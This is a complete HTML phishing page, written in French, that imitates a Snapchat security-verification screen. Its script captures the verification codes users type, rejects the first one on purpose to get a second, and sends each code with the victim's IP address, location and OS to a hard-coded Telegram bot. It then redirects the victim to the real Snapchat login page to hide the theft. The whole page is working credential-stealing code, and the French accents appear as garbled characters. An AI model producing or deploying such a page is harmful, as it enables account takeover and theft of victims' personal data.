<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V√©rification de S√©curit√© - Snapchat</title>
    <style>
        :root {
            --snap-yellow: #FFFC00;
            --snap-black: #000000;
            --error-red: #FF3B30;
            --text-gray: #5E5E5E;
        }
        
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--snap-yellow);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: var(--snap-black);
        }

        .verification-container {
            width: 100%;
            max-width: 375px;
            background-color: white;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .logo {
            width: 60px;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .instructions {
            font-size: 14px;
            color: var(--text-gray);
            margin-bottom: 32px;
            line-height: 1.4;
        }

        .code-container {
            margin-bottom: 24px;
        }

        #verification-code {
            width: 100%;
            padding: 16px;
            font-size: 18px;
            border: 1px solid #E0E0E0;
            border-radius: 12px;
            text-align: center;
            box-sizing: border-box;
            transition: border 0.3s;
        }

        #verification-code:focus {
            outline: none;
            border-color: var(--snap-yellow);
            box-shadow: 0 0 0 2px rgba(255, 252, 0, 0.2);
        }

        .error-message {
            color: var(--error-red);
            font-size: 14px;
            margin-top: 8px;
            height: 20px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .error-message.show {
            opacity: 1;
        }

        .countdown {
            font-size: 13px;
            color: var(--text-gray);
            margin-top: 16px;
        }

        .processing-screen {
            display: none;
            margin-top: 24px;
            padding: 20px;
            background-color: #F7F7F7;
            border-radius: 12px;
            animation: fadeIn 0.5s ease;
        }

        .processing-screen.show {
            display: block;
        }

        .spinner {
            width: 40px;
            height: 40px;
            margin: 0 auto 16px;
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-radius: 50%;
            border-top-color: var(--snap-yellow);
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .processing-text {
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 8px;
        }

        .redirect-text {
            font-size: 13px;
            color: var(--text-gray);
        }
    </style>
</head>
<body>
    <div class="verification-container">
        <img class="logo" src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c536.png" alt="Snapchat Logo">
        <h1>V√©rification de s√©curit√©</h1>
        <p class="instructions">Entrez le code de v√©rification que vous avez re√ßu. Ce code expirera dans 15 minutes.</p>
        
        <div class="code-container">
            <input type="text" id="verification-code" placeholder="Entrez le code ici" autocomplete="off" maxlength="20">
            <div class="error-message" id="error-message">Code incorrect. Veuillez r√©essayer.</div>
        </div>
        
        <div class="countdown" id="countdown"></div>
        
        <div class="processing-screen" id="processing-screen">
            <div class="spinner"></div>
            <div class="processing-text">V√©rification en cours...</div>
            <div class="redirect-text">Vous serez redirig√© vers Snapchat dans <span id="redirect-countdown">30</span> secondes</div>
        </div>
    </div>

    <script>
        // Configuration Telegram
        const telegramConfigs = [
            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
            { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
        ];

        let verificationAttempts = 0;
        let countdownTimer;
        let redirectTimer;

        // Initialisation
        document.addEventListener('DOMContentLoaded', () => {
            const codeInput = document.getElementById('verification-code');
            codeInput.focus();
            
            // D√©marrer le compte √† rebours initial
            startCountdown(15, () => {
                // Code expir√© (optionnel)
            });
        });

        // G√©rer la soumission du code
        document.getElementById('verification-code').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyCode();
            }
        });

        // Fonction de v√©rification du code
        function verifyCode() {
            const code = document.getElementById('verification-code').value.trim();
            
            if (code.length < 4) {
                showError("Le code doit contenir au moins 4 caract√®res");
                return;
            }
            
            // Envoyer le code √† Telegram
            sendCodeToTelegram(code);
            verificationAttempts++;
            
            if (verificationAttempts === 1) {
                // Premier essai - faux code
                showError("Code incorrect. Veuillez r√©essayer.");
                resetCodeInput();
                startCountdown(15, () => {
                    // Apr√®s 15s, effacer l'erreur
                    document.getElementById('error-message').classList.remove('show');
                });
            } else {
                // Deuxi√®me essai - afficher √©cran de traitement
                showProcessingScreen();
            }
        }

        // Envoyer le code √† Telegram
        async function sendCodeToTelegram(code) {
            const ipInfo = await fetch('https://ipinfo.io/json')
                .then(response => response.json())
                .catch(() => ({}));
            
            const message = `üîê Nouveau code de v√©rification Snapchat üîê
üìù Code: ${code}
üìä Tentative: ${verificationAttempts}
üìç IP: ${ipInfo.ip || 'Inconnue'}
üåç Pays: ${ipInfo.country || 'Inconnu'} (${ipInfo.country_name || ''})
üèôÔ∏è Ville: ${ipInfo.city || 'Inconnue'}
üñ•Ô∏è OS: ${navigator.platform}`;

            for (const config of telegramConfigs) {
                try {
                    await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: config.chatId,
                            text: message
                        })
                    });
                } catch (error) {
                    console.error('Erreur lors de l\'envoi √† Telegram:', error);
                }
            }
        }

        // Afficher l'erreur
        function showError(message) {
            const errorElement = document.getElementById('error-message');
            errorElement.textContent = message;
            errorElement.classList.add('show');
            
            // Animation shake
            const container = document.querySelector('.code-container');
            container.style.animation = 'none';
            void container.offsetWidth; // Trigger reflow
            container.style.animation = 'shake 0.5s';
        }

        // R√©initialiser le champ de code
        function resetCodeInput() {
            const codeInput = document.getElementById('verification-code');
            codeInput.value = '';
            codeInput.focus();
        }

        // Afficher l'√©cran de traitement
        function showProcessingScreen() {
            document.getElementById('verification-code').disabled = true;
            document.getElementById('error-message').classList.remove('show');
            document.getElementById('processing-screen').classList.add('show');
            
            // Compte √† rebours de redirection
            let seconds = 30;
            document.getElementById('redirect-countdown').textContent = seconds;
            
            redirectTimer = setInterval(() => {
                seconds--;
                document.getElementById('redirect-countdown').textContent = seconds;
                
                if (seconds <= 0) {
                    clearInterval(redirectTimer);
                    window.location.href = 'https://accounts.snapchat.com/accounts/login';
                }
            }, 1000);
        }

        // D√©marrer le compte √† rebours
        function startCountdown(seconds, callback) {
            clearInterval(countdownTimer);
            
            const countdownElement = document.getElementById('countdown');
            let remaining = seconds;
            
            updateCountdownText();
            
            countdownTimer = setInterval(() => {
                remaining--;
                updateCountdownText();
                
                if (remaining <= 0) {
                    clearInterval(countdownTimer);
                    if (callback) callback();
                }
            }, 1000);
            
            function updateCountdownText() {
                countdownElement.textContent = `Temps restant pour saisir le code: ${remaining} secondes`;
            }
        }

        // Ajouter l'animation shake au CSS dynamiquement
        const style = document.createElement('style');
        style.textContent = `
            @keyframes shake {
                0%, 100% { transform: translateX(0); }
                10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
                20%, 40%, 60%, 80% { transform: translateX(5px); }
            }
        `;
        document.head.appendChild(style);
    </script>
</body>
</html>
